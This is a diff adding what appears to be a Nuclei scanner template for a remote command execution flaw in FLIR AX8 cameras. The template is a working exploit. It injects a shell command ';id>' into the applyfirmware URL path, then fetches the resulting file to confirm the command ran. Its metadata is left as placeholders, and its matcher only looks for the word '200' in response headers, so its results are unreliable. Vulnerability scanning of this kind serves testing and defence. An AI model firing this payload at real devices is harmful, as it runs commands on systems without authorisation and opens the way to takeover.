@@ -1,0 +1,21 @@
+id: FLIR-AX8-applyfirmware-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: https://github.com/wy876/POC/commit/8ebce0929148d8e44ba68c777ccf0c28a8f38b7e#diff-8fa7d504beb1c0c72eb593c04fcaa02029a03aee5b4c8fa7daca1a7dbde24079R1
+  reference:
+    - https://github.com/wy876/POC/commit/8ebce0929148d8e44ba68c777ccf0c28a8f38b7e#diff-8fa7d504beb1c0c72eb593c04fcaa02029a03aee5b4c8fa7daca1a7dbde24079R1
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/settings/applyfirmware/;id>{{filename}}.txt;/false"
+      - "{{BaseURL}}/{{filename}}.txt"
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
